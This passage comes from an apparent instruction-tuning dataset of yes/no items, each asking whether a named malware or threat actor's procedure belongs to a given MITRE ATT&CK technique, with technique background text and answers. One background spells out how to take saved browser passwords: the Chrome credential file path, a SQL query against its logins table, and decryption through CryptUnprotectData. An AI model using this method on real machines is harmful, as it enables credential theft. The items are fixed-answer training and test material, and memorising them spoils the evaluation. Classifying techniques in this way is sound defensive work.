    "instruction": "Background Native API: Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools..\nQ: Is procedure Emotet has used `CreateProcess` to create a new process to run its executable and `WNetEnumResourceW` to enumerate non-hidden shares. a type of technique Native API.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Native API: Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.",
      "question": "Is procedure Emotet has used `CreateProcess` to create a new process to run its executable and `WNetEnumResourceW` to enumerate non-hidden shares. a type of technique Native API",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure APT39 has used the Smartftp Password Decryptor tool to decrypt FTP passwords. a type of technique Container Administration Command.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Credentials from Password Stores: Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications and services that store passwords to make them easier for users to manage and maintain, such as password managers and cloud secrets vaults. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.",
      "question": "Is procedure APT39 has used the Smartftp Password Decryptor tool to decrypt FTP passwords. a type of technique Container Administration Command",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Develop Capabilities: Malware: Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nAs with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.\n\nSome aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of Web Services..\nQ: Is procedure For Operation Sharpshooter, the threat actors used the Rising Sun modular backdoor.  related to technique Command and Scripting Interpreter: Python.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is related to Develop Capabilities: Malware",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Develop Capabilities: Malware: Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nAs with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.\n\nSome aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of Web Services.",
      "question": "Is procedure For Operation Sharpshooter, the threat actors used the Rising Sun modular backdoor.  related to technique Command and Scripting Interpreter: Python",
      "yes/no": "No.\nThe provided context is related to Develop Capabilities: Malware",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Out1 can copy files and Registry data from compromised hosts.  related to technique Remote Access Software",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Data from Local System: Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system.",
      "question": "Is procedure Out1 can copy files and Registry data from compromised hosts.  related to technique Remote Access Software",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure Prestige can traverse the file system to discover files to encrypt by identifying specific extensions defined in a hardcoded list. a type of technique File and Directory Discovery.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "File and Directory Discovery: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
      "question": "Is procedure Prestige can traverse the file system to discover files to encrypt by identifying specific extensions defined in a hardcoded list. a type of technique File and Directory Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Archive Collected Data: Archive via Custom Method: An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used..\nQ: Is procedure During C0017, APT41 hex-encoded PII data prior to exfiltration.  related to technique Application Window Discovery.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is related to Archive Collected Data: Archive via Custom Method",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Archive Collected Data: Archive via Custom Method: An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.",
      "question": "Is procedure During C0017, APT41 hex-encoded PII data prior to exfiltration.  related to technique Application Window Discovery",
      "yes/no": "No.\nThe provided context is related to Archive Collected Data: Archive via Custom Method",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure S-Type has deleted files it has created on a compromised host. a type of technique Application Layer Protocol: Mail Protocols",
    "context": "",
    "output": "No.\nThe provided context is related to Indicator Removal: File Deletion",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Indicator Removal: File Deletion: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
      "question": "Is procedure S-Type has deleted files it has created on a compromised host. a type of technique Application Layer Protocol: Mail Protocols",
      "yes/no": "No.\nThe provided context is related to Indicator Removal: File Deletion",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure BoxCaon can execute arbitrary commands and utilize the \"ComSpec\" environment variable.  related to technique Develop Capabilities: Code Signing Certificates",
    "context": "",
    "output": "No.\nThe provided context is correlated with Command and Scripting Interpreter: Windows Command Shell",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Command and Scripting Interpreter: Windows Command Shell: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "question": "Is procedure BoxCaon can execute arbitrary commands and utilize the \"ComSpec\" environment variable.  related to technique Develop Capabilities: Code Signing Certificates",
      "yes/no": "No.\nThe provided context is correlated with Command and Scripting Interpreter: Windows Command Shell",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Encrypted Channel: Symmetric Cryptography: Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4..\nQ: Is procedure LookBack uses a modified version of RC4 for data transfer.  related to technique Command and Scripting Interpreter.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is correlated with Encrypted Channel: Symmetric Cryptography",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Encrypted Channel: Symmetric Cryptography: Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
      "question": "Is procedure LookBack uses a modified version of RC4 for data transfer.  related to technique Command and Scripting Interpreter",
      "yes/no": "No.\nThe provided context is correlated with Encrypted Channel: Symmetric Cryptography",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure RATANKBA lists the system\u2019s processes. a type of technique Process Discovery",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Process Discovery: Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. \n\nOn network devices, Network Device CLI commands such as `show processes` can be used to display current running processes.",
      "question": "Is procedure RATANKBA lists the system\u2019s processes. a type of technique Process Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Exfiltration Over C2 Channel: Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications..\nQ: Is procedure Mafalda can send network system data and files to its C2 server. a type of technique User Execution: Malicious Link.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is related to Exfiltration Over C2 Channel",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Exfiltration Over C2 Channel: Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
      "question": "Is procedure Mafalda can send network system data and files to its C2 server. a type of technique User Execution: Malicious Link",
      "yes/no": "No.\nThe provided context is related to Exfiltration Over C2 Channel",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure Transparent Tribe can mimic legitimate Windows directories by using the same icons and names.  related to technique Unsecured Credentials: Cloud Instance Metadata API.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe correct answer is Masquerading: Match Legitimate Name or Location",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Masquerading: Match Legitimate Name or Location: Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.",
      "question": "Is procedure Transparent Tribe can mimic legitimate Windows directories by using the same icons and names.  related to technique Unsecured Credentials: Cloud Instance Metadata API",
      "yes/no": "No.\nThe correct answer is Masquerading: Match Legitimate Name or Location",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure Denis can launch a remote shell to execute arbitrary commands on the victim\u2019s machine. a type of technique Command and Scripting Interpreter: Windows Command Shell.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Command and Scripting Interpreter: Windows Command Shell: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "question": "Is procedure Denis can launch a remote shell to execute arbitrary commands on the victim\u2019s machine. a type of technique Command and Scripting Interpreter: Windows Command Shell",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure LuminousMoth has used ARP spoofing to redirect a compromised machine to an actor-controlled website. a type of technique Adversary-in-the-Middle: ARP Cache Poisoning",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Adversary-in-the-Middle: ARP Cache Poisoning: Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation.\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address. Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.",
      "question": "Is procedure LuminousMoth has used ARP spoofing to redirect a compromised machine to an actor-controlled website. a type of technique Adversary-in-the-Middle: ARP Cache Poisoning",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Obfuscated Files or Information: Encrypted/Encoded File: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution..\nAnswer in Yes or No.\n\nQuestion: Is procedure Woody RAT has used Base64 encoded strings and scripts. a type of technique File and Directory Discovery",
    "context": "",
    "output": "No.\nThe provided context is correlated with Obfuscated Files or Information: Encrypted/Encoded File",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Obfuscated Files or Information: Encrypted/Encoded File: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.",
      "question": "Is procedure Woody RAT has used Base64 encoded strings and scripts. a type of technique File and Directory Discovery",
      "yes/no": "No.\nThe provided context is correlated with Obfuscated Files or Information: Encrypted/Encoded File",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Koadic can retrieve the contents of the IP routing table as well as information about the Windows domain. a type of technique Create or Modify System Process: Launch Agent",
    "context": "",
    "output": "No.\nThe provided context is related to System Network Configuration Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Network Configuration Discovery: Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",
      "question": "Is procedure Koadic can retrieve the contents of the IP routing table as well as information about the Windows domain. a type of technique Create or Modify System Process: Launch Agent",
      "yes/no": "No.\nThe provided context is related to System Network Configuration Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure OSX_OCEANLOTUS.D uses PowerShell scripts.  related to technique Command and Scripting Interpreter: PowerShell",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Command and Scripting Interpreter: PowerShell: Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).",
      "question": "Is procedure OSX_OCEANLOTUS.D uses PowerShell scripts.  related to technique Command and Scripting Interpreter: PowerShell",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure SVCReady can collect data from an infected host.  related to technique Office Application Startup: Office Test.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe correct answer is Data from Local System",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Data from Local System: Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system.",
      "question": "Is procedure SVCReady can collect data from an infected host.  related to technique Office Application Startup: Office Test",
      "yes/no": "No.\nThe correct answer is Data from Local System",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Malteiro has stolen credentials stored in the victim\u2019s browsers via software tool NirSoft WebBrowserPassView. a type of technique Account Discovery: Email Account",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Credentials from Password Stores: Credentials from Web Browsers: Adversaries may acquire credentials from web browsers by reading files specific to the target browser. Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim\u2019s cached logon credentials as the decryption key.\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the Windows Credential Manager.\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",
      "question": "Is procedure Malteiro has stolen credentials stored in the victim\u2019s browsers via software tool NirSoft WebBrowserPassView. a type of technique Account Discovery: Email Account",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Command and Scripting Interpreter: Unix Shell: Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution. Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.\n\nUnix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with SSH. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence..\nAnswer in Yes or No.\n\nQuestion: Is procedure Green Lambert can use shell scripts for execution, such as <code>/bin/sh -c</code>.  related to technique Command and Scripting Interpreter: Unix Shell",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Command and Scripting Interpreter: Unix Shell: Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution. Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.\n\nUnix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with SSH. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.",
      "question": "Is procedure Green Lambert can use shell scripts for execution, such as <code>/bin/sh -c</code>.  related to technique Command and Scripting Interpreter: Unix Shell",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure MechaFlounder uses a python-based payload. a type of technique Shared Modules.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is correlated with Command and Scripting Interpreter: Python",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Command and Scripting Interpreter: Python: Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",
      "question": "Is procedure MechaFlounder uses a python-based payload. a type of technique Shared Modules",
      "yes/no": "No.\nThe provided context is correlated with Command and Scripting Interpreter: Python",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
